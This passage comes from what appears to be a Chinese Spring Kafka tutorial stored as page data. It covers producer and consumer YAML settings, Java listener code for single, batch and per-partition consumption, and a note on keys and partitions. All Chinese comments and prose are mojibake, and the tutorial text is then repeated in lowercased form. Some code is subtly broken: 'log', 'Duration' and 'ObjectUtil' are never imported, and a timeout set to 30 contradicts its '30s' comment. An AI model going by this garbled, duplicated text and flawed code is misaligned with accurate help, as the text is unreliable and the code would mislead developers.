¶å®éå¶äº producer å¨åä¸ª broker è¿æ¥ä¸è½å¤åéçæªååºè¯·æ±çæ°é\n        # è®¾ç½®æ1 ,producer å¨æä¸ª broker åéååºä¹åå°æ æ³åç»è¯¥ broker åé PRODUCE è¯·æ±\n        max.in.flight.requests.per.connection: 1\n      # buffer-memory çäº§ç«¯ç¼å²åºå¤§å°ï¼é»è®¤å¼ 33554432B=32MBã\n      # producer å¯å¨æ¶ä¼é¦ååå»ºä¸ååå­ç¼å²åºç¨äºä¿å­å¾åéçæ¶æ¯ï¼ç¶åç±å¦ä¸ä¸ªä¸å±çº¿ç¨è´è´£ä»ç¼å²åºä¸­è¯»åæ¶æ¯æ§è¡çæ­£çåéãè¿é¨ååå­ç©ºé´\n      # çå¤§å°å³æ¯ç± buffer.memory åæ°æå®çãè¥ producer åç¼å²åºåæ¶æ¯çéåº¦è¶è¿äºä¸å± io çº¿ç¨åéæ¶æ¯çéåº¦ï¼é£ä¹å¿ç¶é æè¯¥ç¼å²åºç©ºé´\n      # çä¸æ­å¢å¤§ãæ­¤æ¶ producer ä¼åæ­¢æå¤´çå·¥ä½ç­å¾ io çº¿ç¨è¿½ä¸æ¥ï¼è¥ä¸æ®µæ¶é´ä¹å io çº¿ç¨è¿æ¯æ æ³è¿½ä¸ producer çè¿åº¦ï¼é£ä¹ producer\n      # å°±ä¼æåºå¼å¸¸å¹¶ææç¨æ·ä»å¥è¿è¡å¤çãè¥ producer ç¨åºè¦ç»å¾å¤ååºåéæ¶æ¯ï¼é£ä¹å°±éè¦ä»ç»å°è®¾ç½®è¿ä¸ªåæ°ä»¥é²æ­¢è¿å°çåå­ç¼å²åºéä½äº\n      # producer ç¨åºæ´ä½çååéã\n      buffer-memory: 33554432\n      # Kafkaæä¾çåºåååååºååç±»\n      key-serializer: org.apache.kafka.common.serialization.StringSerializer\n      value-serializer: org.apache.kafka.common.serialization.StringSerializer\n      # åç¼©ï¼é»è®¤ none(gzip\\snappy\\lz4)ï¼è½éä½ç½ç»IOæé«ååéï¼ä½ä¹ä¼å¢å  producer ç«¯æºå¨ç CPU å¼éã\n      # å¦æ broker ç«¯çåç¼©åæ°è®¾ ç½®å¾ä¸ producer ä¸åï¼ broker ç«¯å¨åå¥æ¶æ¯æ¶ä¹ä¼é¢å¤ä½¿ç¨ CPU èµæºå¯¹æ¶æ¯è¿è¡å¯¹åºçè§£åç¼©ï¼éåç¼©æä½ã\n      compression-type: lz4\n    ###########ãåå§åæ¶è´¹èéç½®ã###########\n    consumer:\n      # é»è®¤çæ¶è´¹ç»ID\n      groupId: wx_public_number\n      properties:\n        # æ¶è´¹ä¼è¯è¶æ¶æ¶é´(è¶è¿è¿ä¸ªæ¶é´consumeræ²¡æåéå¿è·³,å°±ä¼è§¦årebalanceæä½)\n        session.timeout.ms: 10000\n        # æ¶è´¹è¯·æ±è¶æ¶æ¶é´\n        request.timeout.ms: 3000\n        # æ¶è´¹å°çæ°æ®å¤çæ¶é¿ä¸å®è¶è¿max.poll.interval.msï¼å¦åä¼è§¦årebalanceï¼ä¹å¯è½å¯¼è´ offset æäº¤å¤±è´¥\n        max.poll.interval.ms: 10000\n        # æä½æå 1KB çæ°æ®\n        fetch.min.bytes: 1024\n        # ä¸è¶³ 1KB è®©ç­å¾ 2s åå»æå\n        fetch.max.wait.ms: 2000\n      # æ¯å¦èªå¨æäº¤ consumer offsetï¼æ¹éçæ¶åè¦æ¹ä¸º false\n      enable-auto-commit: true\n      # èªå¨æäº¤çæ¶é´é´é\n      auto-commit-interval: 200\n      # åè®¾ä½ é¦æ¬¡è¿è¡ä¸ä¸ª consumer group å¹¶ä¸æå®ä»å¤´æ¶è´¹ãæ¾ç¶è¯¥ group ä¼ä»å¤´æ¶è´¹æææ°æ®ï¼å ä¸ºæ­¤æ¶è¯¥ group è¿æ²¡æä»»ä½ä½ç§»ä¿¡æ¯ã\n      # ä¸æ¦è¯¥ group æåæäº¤ä½ç§»åï¼ä½ éå¯äº group ï¼ä¾ç¶æå®ä»å¤´æ¶è´¹ãæ­¤æ¶ä½ ä¼åç°è¯¥ group å¹¶ä¸ä¼ççä»å¤´æ¶è´¹ï¼å ä¸º Kafka å·±ç»ä¿å­äºè¯¥ group\n      # ä½ç§»ä¿¡æ¯ï¼å æ­¤å®ä¼æ è§ auto.offset.reset çè®¾ç½®ã\n      # latestï¼é»è®¤å¼ï¼æå®ä»ææ°å¤ä½ç§»å¼å§æ¶è´¹\n      # earliest ï¼æå®ä»ææ©çä½ç§»å¼å§æ¶è´¹ï¼æ³¨æè¿éææ©çä½ç§»ä¸ä¸å®å°±æ¯0\n      # none:åªè¦æä¸ä¸ªååºä¸å­å¨å·²æäº¤çoffset,å°±æåºå¼å¸¸;\n      auto-offset-reset: earliest\n      # Kafkaæä¾çåºåååååºååç±»\n      key-deserializer: org.apache.kafka.common.serialization.StringDeserializer\n      value-deserializer: org.apache.kafka.common.serialization.StringDeserializer\n      # æ¹éæ¶è´¹æ¯æ¬¡æå¤æ¶è´¹å¤å°æ¡æ¶æ¯\n      max-poll-records: 10000\n      # Fetchè¯·æ±åç» brokeråï¼å¨brokerä¸­å¯è½ä¼è¢«é»å¡çï¼å½topicä¸­recordsçæ»sizeå°äºfetch.min.bytesæ¶ï¼ï¼æ­¤æ¶è¿ä¸ªfetchè¯·æ±èæ¶å°±ä¼æ¯è¾é¿ãè¿ä¸ªéç½®å°±æ¯æ¥éç½®consumeræå¤ç­å¾responseå¤ä¹ãæ¯«ç§æ°\n      fetch-max-wait: 1000\n    # æ¶è´¹ç«¯çå¬çtopicä¸å­å¨æ¶ï¼é¡¹ç®å¯å¨ä¼æ¥é(å³æ)\n    listener:\n      # æ¶è´¹èå¹¶åå¯å¨ä¸ªæ°ï¼å¯¹åºååºä¸ªæ°ï¼æ¯ä¸ªlisteneræ¹æ³\n      concurrency: 4\n      # manual listenerè´è´£ackï¼ä½æ¯èåä¹æ¯æ¹éä¸å»\n      # manual_immediate listnerè´è´£ackï¼æ¯è°ç¨ä¸æ¬¡ï¼å°±ç«å³commit\n      # count_time ackTimeæackCountåªä¸ªæ¡ä»¶åæ»¡è¶³ï¼å°±commit\n      # count ç´¯ç§¯è¾¾å°ackCountæ¬¡çackå»commit\n      # record æ¯å¤çä¸æ¡commitä¸æ¬¡\n      # batch æ¯æ¬¡pollçæ¶åæ¹éæäº¤ä¸æ¬¡ï¼é¢çåå³äºæ¯æ¬¡pollçè°ç¨é¢ç\n      # time æ¯æ¬¡é´éackTimeçæ¶é´å»commit\n      # ack-mode: manual\n      missing-topics-fatal: false\n      poll-timeout: 3000\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n\n\n> groupId ä¸è¬ä¸ºé¡¹ç®åç§°æå¥½ï¼æ¶è´¹è ID ä¸è¬ä¸ºä¸å¡æåè½åç§°ï¼topic çè®¾è®¡æå¥½æ¯ é¡¹ç®_ä¸å¡_åè½_æ è¯ ID\n\n\n# çäº§ä¸æ¶è´¹\n\nimport org.apache.kafka.clients.admin.NewTopic;\nimport org.apache.kafka.clients.consumer.ConsumerRecord;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.CommandLineRunner;\nimport org.springframework.boot.SpringApplication;\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.kafka.annotation.KafkaListener;\nimport org.springframework.kafka.annotation.KafkaListeners;\nimport org.springframework.kafka.config.ConcurrentKafkaListenerContainerFactory;\nimport org.springframework.kafka.config.KafkaListenerContainerFactory;\nimport org.springframework.kafka.config.TopicBuilder;\nimport org.springframework.kafka.core.DefaultKafkaConsumerFactory;\nimport org.springframework.kafka.core.KafkaTemplate;\nimport org.springframework.kafka.support.Acknowledgment;\n\nimport javax.annotation.Resource;\nimport java.util.List;\n\n@SpringBootApplication\npublic class KafkaApplication implements CommandLineRunner {\n\n\t@Resource\n\tKafkaTemplate<String, String> kafkaTemplate;\n\n\tpublic static void main(String[] args) {\n\t\tSpringApplication.run(KafkaApplication.class, args);\n\t}\n\n\t@Override\n\tpublic void run(String... args){\n\t\tProducerRecord<String, String> producerRecord = new ProducerRecord<>("topic1", "11111");\n\t\tkafkaTemplate.send(producerRecord);\n\t}\n\n\t/**\n\t * åå»º topic\n\t * @author big uncle\n\t * @date 2021/2/20 10:49\n\t * @param\n\t * @return org.apache.kafka.clients.admin.NewTopic\n\t **/\n\t@Bean\n\tpublic NewTopic topic() {\n\t\treturn TopicBuilder.name("topic1")\n\t\t\t\t.partitions(4)\n\t\t\t\t.replicas(1)\n\t\t\t\t.build();\n\t}\n\n\t/**\n\t * æ¶è´¹ æå¨ACK éè¦ä¿®æ¹  enable-auto-commit: false\n\t**/\n\t@KafkaListener(id = "myId1", topics = "topic1",groupId="wx_public_number")\n\tpublic void listen1(String in, Acknowledgment ack) {\n\t\tSystem.out.println("aaåæ¶è´¹:"+in);\n\t\tack.acknowledge();\n\t}\n\t/**\n\t * æ¶è´¹èªå¨ACK éè¦ enable-auto-commit: true\n\t**/\n\t@KafkaListener(id = "myId2", topics = "topic1",groupId="wx_public_number")\n\tpublic void listen2(String in) {\n\t\tSystem.out.println("bbåæ¶è´¹:"+in);\n\t}\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n\n\n> topic çæ¶æ¯ä¼è¢«åéå°ä¸åçæ¶è´¹ç»ï¼ä¸åçæ¶è´¹ç»åå»ºä¸ä¸ªæ¶è´¹èä¼å®ç°å¹¿æ­æ¶è´¹æ¨¡å¼ï¼åæ­çè¯åªéè¦å æå¤ä½çç»å°±å¥½ã\n\n\n# æ¹éæ¶è´¹\n\npackage com.giant.kafka.config;\n\nimport org.apache.kafka.clients.consumer.ConsumerConfig;\nimport org.springframework.boot.autoconfigure.kafka.KafkaProperties;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.kafka.config.ConcurrentKafkaListenerContainerFactory;\nimport org.springframework.kafka.config.KafkaListenerContainerFactory;\nimport org.springframework.kafka.core.DefaultKafkaConsumerFactory;\nimport org.springframework.kafka.listener.ContainerProperties;\n\nimport javax.annotation.Resource;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.function.Consumer;\n\n/**\n * kafka æ¹ééç½®\n * @Author big uncle\n * @Date 2021/7/7 10:01\n**/\n@Configuration\npublic class KafkaBatchConf {\n\n    @Resource\n    KafkaProperties properties;\n\n\n    /**\n     *  æ¶è´¹èæ¹éå·¥ç¨\n     *  æå¨æäº¤\n     */\n    @Bean\n    public KafkaListenerContainerFactory<?> batchFactoryAck() {\n        return batchFactoryTemplate(factory -> {\n            Map<String, Object> props = consumeProps();\n            // æå¨æäº¤\n            props.put(ConsumerConfig.ENABLE_AUTO_COMMIT_CONFIG, Boolean.FALSE);\n            factory.setConsumerFactory(new DefaultKafkaConsumerFactory<>(props));\n            factory.getContainerProperties().setAckMode(ContainerProperties.AckMode.MANUAL_IMMEDIATE);\n        });\n    }\n\n    /**\n     *  æ¶è´¹èæ¹éå·¥ç¨\n     *  èªå¨æäº¤\n     */\n    @Bean\n    public KafkaListenerContainerFactory<?> batchFactory() {\n        Map<String, Object> props = consumeProps();\n        // æä½æåæåæ°æ®çå¤§å°\n        props.put(ConsumerConfig.FETCH_MIN_BYTES_CONFIG,  properties.getConsumer().getProperties().get(ConsumerConfig.FETCH_MIN_BYTES_CONFIG));\n        // ä¸å¤æä½æåç­å¾ä¸å®çæ¶é´åå»æå\n        props.put(ConsumerConfig.FETCH_MAX_WAIT_MS_CONFIG,   properties.getConsumer().getProperties().get(ConsumerConfig.FETCH_MAX_WAIT_MS_CONFIG));\n        return batchFactoryTemplate(factory -> factory.setConsumerFactory(new DefaultKafkaConsumerFactory<>(props)));\n    }\n\n    /**\n     *  æ¶è´¹èéç½®ä¿¡æ¯\n     */\n    private Map<String,Object> consumeProps() {\n        Map<String, Object> props = new HashMap<>(20);\n        // kafka server å°å\n        props.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, properties.getBootstrapServers());\n        // ç»id\n        props.put(ConsumerConfig.GROUP_ID_CONFIG, properties.getConsumer().getGroupId());\n        // åç§»é\n        props.put(ConsumerConfig.AUTO_OFFSET_RESET_CONFIG, properties.getConsumer().getAutoOffsetReset());\n        // æå¤§æåæ¡æ°ï¼è¯¥åæ°è¢«fetch.max.wait.msãfetch.min.bytesãmax.partition.fetch.bytes æå½±å\n        props.put(ConsumerConfig.MAX_POLL_RECORDS_CONFIG, properties.getConsumer().getMaxPollRecords());\n        // ä¼è¯è¶æ¶æ¶é´\n        props.put(ConsumerConfig.SESSION_TIMEOUT_MS_CONFIG, properties.getConsumer().getProperties().get(ConsumerConfig.SESSION_TIMEOUT_MS_CONFIG));\n        // è¯·æ±è¶æ¶æ¶é´\n        props.put(ConsumerConfig.REQUEST_TIMEOUT_MS_CONFIG, properties.getConsumer().getProperties().get(ConsumerConfig.REQUEST_TIMEOUT_MS_CONFIG));\n        // keyåºåå\n        props.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, properties.getConsumer().getKeyDeserializer());\n        // å¼åºåå\n        props.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, properties.getConsumer().getValueDeserializer());\n        // èªå¨æäº¤\n        props.put(ConsumerConfig.ENABLE_AUTO_COMMIT_CONFIG, Boolean.TRUE);\n        // èªå¨æäº¤æ¶é´é´é\n        Duration autoCommitInterval = properties.getConsumer().getAutoCommitInterval();\n        if(!ObjectUtil.isEmpty(autoCommitInterval)){\n            props.put(ConsumerConfig.AUTO_COMMIT_INTERVAL_MS_CONFIG, Long.valueOf(autoCommitInterval.toMillis()).intValue());\n        }\n        // poll é´éæ¶é´\n        props.put(ConsumerConfig.MAX_POLL_INTERVAL_MS_CONFIG,  properties.getConsumer().getProperties().get(ConsumerConfig.MAX_POLL_INTERVAL_MS_CONFIG));\n        return props;\n    }\n\n\n    /**\n     * æ¹éæ¶è´¹æ¨¡æ¿\n    **/\n    private ConcurrentKafkaListenerContainerFactory batchFactoryTemplate(Consumer<ConcurrentKafkaListenerContainerFactory> consumer){\n        ConcurrentKafkaListenerContainerFactory<Integer, String> factory = new ConcurrentKafkaListenerContainerFactory<>();\n        consumer.accept(factory);\n        factory.setBatchListener(Boolean.TRUE);\n        // å¹¶åçº¿ç¨æ°\n        factory.setConcurrency(properties.getListener().getConcurrency());\n        return factory;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n\n\nimport org.apache.kafka.clients.admin.NewTopic;\nimport org.apache.kafka.clients.consumer.ConsumerRecord;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.CommandLineRunner;\nimport org.springframework.boot.SpringApplication;\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.kafka.annotation.KafkaListener;\nimport org.springframework.kafka.annotation.KafkaListeners;\nimport org.springframework.kafka.config.ConcurrentKafkaListenerContainerFactory;\nimport org.springframework.kafka.config.KafkaListenerContainerFactory;\nimport org.springframework.kafka.config.TopicBuilder;\nimport org.springframework.kafka.core.DefaultKafkaConsumerFactory;\nimport org.springframework.kafka.core.KafkaTemplate;\nimport org.springframework.kafka.support.Acknowledgment;\n\nimport javax.annotation.Resource;\nimport java.util.List;\n\n@SpringBootApplication\npublic class KafkaApplication implements CommandLineRunner {\n\n\t@Resource\n\tKafkaTemplate<String, String> kafkaTemplate;\n\n\tpublic static void main(String[] args) {\n\t\tSpringApplication.run(KafkaApplication.class, args);\n\t}\n\n\t@Override\n\tpublic void run(String... args){\n\t\tProducerRecord<String, String> producerRecord = new ProducerRecord<>("topic1", "11111");\n\t\tkafkaTemplate.send(producerRecord);\n\t}\n\n\t/**\n\t * åå»º topic\n\t * @author big uncle\n\t * @date 2021/2/20 10:49\n\t * @param\n\t * @return org.apache.kafka.clients.admin.NewTopic\n\t **/\n\t@Bean\n\tpublic NewTopic topic() {\n\t\treturn TopicBuilder.name("topic1")\n\t\t\t\t.partitions(4)\n\t\t\t\t.replicas(1)\n\t\t\t\t.build();\n\t}\n\n    /**\n     * æ¹éèªå¨ç¡®è®¤ACK\n    **/\n    @KafkaListener(id = "consumer_1", topics = "topic1",groupId="wx_public_number",containerFactory = "batchFactory")\n    public void consumer_1(List<String> in) {\n        log.debug("æ¶è´¹æ°æ® {}",in.size());\n    }\n\n    /**\n     * æ¹éæå¨ç¡®è®¤ACK\n    **/\n    @KafkaListener(id = "consumer_2", topics = "topic1",groupId="wx_public_number",containerFactory = "batchFactoryAck")\n    public void consumer_2(List<String> in,Acknowledgment ack) {\n        log.debug("æ¶è´¹æ°æ® {}",in.size());\n        ack.acknowledge();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n\n\næ¹éæ¶è´¹ååæ¡æ¶è´¹ä¸å½±åç¸äºä½¿ç¨ã\n\næä¸åååºæ¶è´¹\n\n@KafkaListener(id = "consumer_2", topicPartitions = { @TopicPartition(topic = "topic1", partitions = { "1" }) },groupId="wx_public_number")\npublic void consumer_2(String str) {\n    log.debug("æ¶è´¹æ°æ® {}",str);\n}\n\n\n1\n2\n3\n4\n\n\n> key å partition çåºå«\n> å¦æä¸ä¸ªææç partition å±æ§æ°å¼è¢«æå®ï¼é£ä¹å¨åéè®°å½æ¶ partition å±æ§æ°å¼å°±ä¼è¢«åºç¨ãå¦ææ²¡æ partition å±æ§æ°å¼è¢«æå®ï¼èä¸ä¸ª key å±æ§è¢«å£°æçè¯ï¼ä¸ä¸ª partition ä¼éè¿ key ç hash èè¢«éä¸­ãå¦ææ¢æ²¡æ key ä¹æ²¡æ partition å±æ§æ°å¼è¢«å£°æï¼é£ä¹ä¸ä¸ª partition å°ä¼è¢«åéä»¥è½®è¯¢çæ¹å¼ã',normalizedContent:'# ä¾èµ\n\n<dependencies>\n    \x3c!-- 2.3.7 --\x3e\n    <dependency>\n        <groupid>org.springframework.kafka</groupid>\n        <artifactid>spring-kafka</artifactid>\n    </dependency>\n    <dependency>\n        <groupid>org.springframework.boot</groupid>\n        <artifactid>spring-boot-autoconfigure</artifactid>\n    </dependency>\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# éç½®\n\nspring:\n  kafka:\n    ###########ãkafkaéç¾¤ã###########\n    # 192.168.81.62:9092,192.168.81.62:9092\n    bootstrap-servers: 47.101.179.240:9092\n    ###########ãåå§åçäº§èéç½®ã###########\n    producer:\n      # éè¯æ¬¡æ°ï¼producer ä¸¤æ¬¡éè¯ä¹é´ä¼åé¡¿ä¸æ®µæ¶é´ï¼ä»¥é²æ­¢é¢ç¹å°éè¯å¯¹ç³»ç»å¸¦æ¥å²å»ãè¿æ®µæ¶é´æ¯å¯ä»¥éç½®çï¼ç±åæ° retry.backoff.ms æå®ï¼é»è®¤æ¯ 100 æ¯«ç§\n      # éè¯å¯è½é ææ¶æ¯çéå¤åé,ä¸ºäºåºå¯¹è¿ä¸é£é©ï¼ kafka è¦æ±ç¨æ·å¨ consumer ç«¯å¿é¡»æ§è¡å»éå¤ç\n      # éè¯å¯è½é ææ¶æ¯çä¹±åºï¼producer æä¾äº max.in.flight.requets.per.connectionåæ° ä¸æ¦ç¨æ·å°æ­¤åæ°è®¾ç½®æ 1, producer å°ç¡®ä¿æä¸æ¶å»åªè½åéä¸ä¸ªè¯·æ±\n      retries: 2\n      # acks=0 ï¼ producer ä¸ç­kafkaæ¯å¦æ¥æ¶æåï¼ç«å³å¼å§å¶ä»å·¥ä½ -> æé«ååéï¼åä¼ä¸¢å¤±æ°æ®\n      # acks=1 ï¼ producer åéæ¶æ¯å leader broker ä»å°è¯¥æ¶æ¯åå¥æ¬å°æ¥å¿ï¼ç¶åä¾¿åéååºç»æ producer ï¼èæ é¡»ç­å¾ isr ä¸­å¶ä»å¯æ¬åå¥è¯¥æ¶æ¯ãè½ä¿è¯ååéï¼ä¹è½ä¿è¯ä¸å®çæä¹æ§ã\n      # acks=all/-1 ï¼è¡¨ç¤ºå½åéæ¶æ¯æ¶ï¼ leader broker ä¸ä»ä¼å°æ¶æ¯åå¥æ¬å°æ¥å¿ï¼åæ¶è¿ä¼ç­å¾ isr ä¸­ææå¶ä»å¯æ¬é½æååå¥å®ä»¬åèªçæ¬å°æ¥å¿åï¼æåéååºç»æç»producerãååéæä½ï¼ä½ä¸ä¼ä¸¢å¤±æ°æ®ã\n      acks: 1\n      # åæ°é»è®¤å¼æ¯ 16384b=16kbãproducer ä¼å°åå¾åä¸ååºçå¤æ¡æ¶æ¯å°è£è¿ä¸ä¸ª batch ä¸­ãå½ batch æ»¡äºçæ¶åï¼ producer ä¼åé batch\n      # ä¸­çæææ¶æ¯ãä¸è¿ï¼ producer å¹¶ä¸æ»æ¯ batch æ»¡äºæåéæ¶æ¯ï¼å¾æå¯è½å½ batch è¿æå¾å¤ç©ºé²ç©ºé´æ¶ producer å°±åéè¯¥ batchï¼\n      # producer ä¸ç®¡æ¯å¦è½å¤å¡«æ»¡ï¼ producer é½ä¼ä¸ºè¯¥ batch åéåºå®å¤§å°çåå­ã\n      batch-size: 131072\n      properties:\n        # æ§å¶æ¶æ¯åéå»¶æ¶è¡ä¸º,è¿ä¸ªåæ°ä¹å°±æ¯å½±å batch ä¸æ»¡ä¹ä¼è¢«åéçåå ï¼å®éä¸è¿ä¹æ¯ä¸ç§æè¡¡ï¼å³ååéä¸å»¶æ¶ä¹é´çæè¡¡\n        linger.ms: 200\n        # produce åéè¯·æ±ç»brokeråï¼brokeréè¦å¨è§å®çæ¶é´èå´åå°å¤ççç»æè¿è¿ç» produceãè¿æ®µæ¶é´ä¾¿æ¯ç±è¯¥åæ°æ§å¶çï¼é»è®¤æ¯ 30sã\n        # é»è®¤ç30så¯¹äºä¸è¬çæåµèè¨æ¯è¶³å¤çï¼ä½å¦æ producer åéçè´è½½å¾å¤§ï¼è¶æ¶çæåµå°±å¾å®¹æç¢°å°ï¼æ­¤æ¶å°±åºè¯¥éå½è°æ´è¯¥åæ°å¼ã\n        request.timeout.ms: 30\n        # æ§å¶ producer åéè¯·æ±çå¤§å°ï¼1048576b=1mï¼è¯¥è¯·æ±åæ¬æ¶æ¯ä½åè¯·æ±å¤´çæ´ä½å¤§å°\n        max.request.size: 1048576\n        # ä¸ºé²æ­¢ topic åååºä¸çæ¶æ¯ä¹±åºé®é¢ãè¿ä¸ªåæ°çå®éææå¶å®éå¶äº producer å¨åä¸ª broker è¿æ¥ä¸è½å¤åéçæªååºè¯·æ±çæ°é\n        # è®¾ç½®æ1 ,producer å¨æä¸ª broker åéååºä¹åå°æ æ³åç»è¯¥ broker åé produce è¯·æ±\n        max.in.flight.requests.per.connection: 1\n      # buffer-memory çäº§ç«¯ç¼å²åºå¤§å°ï¼é»è®¤å¼ 33554432b=32mbã\n      # producer å¯å¨æ¶ä¼é¦ååå»ºä¸ååå­ç¼å²åºç¨äºä¿å­å¾åéçæ¶æ¯ï¼ç¶åç±å¦ä¸ä¸ªä¸å±çº¿ç¨è´è´£ä»ç¼å²åºä¸­è¯»åæ¶æ¯æ§è¡çæ­£çåéãè¿é¨ååå­ç©ºé´\n      # çå¤§å°å³æ¯ç± buffer.memory åæ°æå®çãè¥ producer åç¼å²åºåæ¶æ¯çéåº¦è¶è¿äºä¸å± io çº¿ç¨åéæ¶æ¯çéåº¦ï¼é£ä¹å¿ç¶é æè¯¥ç¼å²åºç©ºé´\n      # çä¸æ­å¢å¤§ãæ­¤æ¶ producer ä¼åæ­¢æå¤´çå·¥ä½ç­å¾ io çº¿ç¨è¿½ä¸æ¥ï¼è¥ä¸æ®µæ¶é´ä¹å io çº¿ç¨è¿æ¯æ æ³è¿½ä¸ producer çè¿åº¦ï¼é£ä¹ producer\n      # å°±ä¼æåºå¼å¸¸å¹¶ææç¨æ·ä»å¥è¿è¡å¤çãè¥ producer ç¨åºè¦ç»å¾å¤ååºåéæ¶æ¯ï¼é£ä¹å°±éè¦ä»ç»å°è®¾ç½®è¿ä¸ªåæ°ä»¥é²æ­¢è¿å°çåå­ç¼å²åºéä½äº\n      # producer ç¨åºæ´ä½çååéã\n      buffer-memory: 33554432\n      # kafkaæä¾çåºåååååºååç±»\n      key-serializer: org.apache.kafka.common.serialization.stringserializer\n      value-serializer: org.apache.kafka.common.serialization.stringserializer\n      # åç¼©ï¼é»è®¤ none(gzip\\snappy\\lz4)ï¼è½éä½ç½ç»ioæé«ååéï¼ä½ä¹ä¼å¢å  producer ç«¯æºå¨ç cpu å¼éã\n      # å¦æ broker ç«¯çåç¼©åæ°è®¾ ç½®å¾ä¸ producer ä¸åï¼ broker ç«¯å¨åå¥æ¶æ¯æ¶ä¹ä¼é¢å¤ä½¿ç¨ cpu èµæºå¯¹æ¶æ¯è¿è¡å¯¹åºçè§£åç¼©ï¼éåç¼©æä½ã\n      compression-type: lz4\n    ###########ãåå§åæ¶è´¹èéç½®ã###########\n    consumer:\n      # é»è®¤çæ¶è´¹ç»id\n      groupid: wx_public_number\n      properties:\n        # æ¶è´¹ä¼è¯è¶æ¶æ¶é´(è¶è¿è¿ä¸ªæ¶é´consumeræ²¡æåéå¿è·³,å°±ä¼è§¦årebalanceæä½)\n        session.timeout.ms: 10000\n        # æ¶è´¹è¯·æ±è¶æ¶æ¶é´\n        request.timeout.ms: 3000\n        # æ¶è´¹å°çæ°æ®å¤çæ¶é¿ä¸å®è¶è¿max.poll.interval.msï¼å¦åä¼è§¦årebalanceï¼ä¹å¯è½å¯¼è´ offset æäº¤å¤±è´¥\n        max.poll.interval.ms: 10000\n        # æä½æå 1kb çæ°æ®\n        fetch.min.bytes: 1024\n        # ä¸è¶³ 1kb è®©ç­å¾ 2s åå»æå\n        fetch.max.wait.ms: 2000\n      # æ¯å¦èªå¨æäº¤ consumer offsetï¼æ¹éçæ¶åè¦æ¹ä¸º false\n      enable-auto-commit: true\n      # èªå¨æäº¤çæ¶é´é´é\n      auto-commit-interval: 200\n      # åè®¾ä½ é¦æ¬¡è¿è¡ä¸ä¸ª consumer group å¹¶ä¸æå®ä»å¤´æ¶è´¹ãæ¾ç¶è¯¥ group ä¼ä»å¤´æ¶è´¹æææ°æ®ï¼å ä¸ºæ­¤æ¶è¯¥ group è¿æ²¡æä»»ä½ä½ç§»ä¿¡æ¯ã\n      # ä¸æ¦è¯¥ group æåæäº¤ä½ç§»åï¼ä½ éå¯äº group ï¼ä¾ç¶æå®ä»å¤´æ¶è´¹ãæ­¤æ¶ä½ ä¼åç°è¯¥ group å¹¶ä¸ä¼ççä»å¤´æ¶è´¹ï¼å ä¸º kafka å·±ç»ä¿å­äºè¯¥ group\n      # ä½ç§»ä¿¡æ¯ï¼å æ­¤å®ä¼æ è§ auto.offset.reset çè®¾ç½®ã\n      # latestï¼é»è®¤å¼ï¼æå®ä»ææ°å¤ä½ç§»å¼å§æ¶è´¹\n      # earliest ï¼æå®ä»ææ©çä½ç§»å¼å§æ¶è´¹ï¼æ³¨æè¿éææ©çä½ç§»ä¸ä¸å®å°±æ¯0\n      # none:åªè¦æä¸ä¸ªååºä¸å­å¨å·²æäº¤çoffset,å°±æåºå¼å¸¸;\n      auto-offset-reset: earliest\n      # kafkaæä¾çåºåååååºååç±»\n      key-deserializer: org.apache.kafka.common.serialization.stringdeserializer\n      value-deserializer: org.apache.kafka.common.serialization.stringdeserializer\n      # æ¹éæ¶è´¹æ¯æ¬¡æå¤æ¶è´¹å¤å°æ¡æ¶æ¯\n      max-poll-records: 10000\n      # fetchè¯·æ±åç» 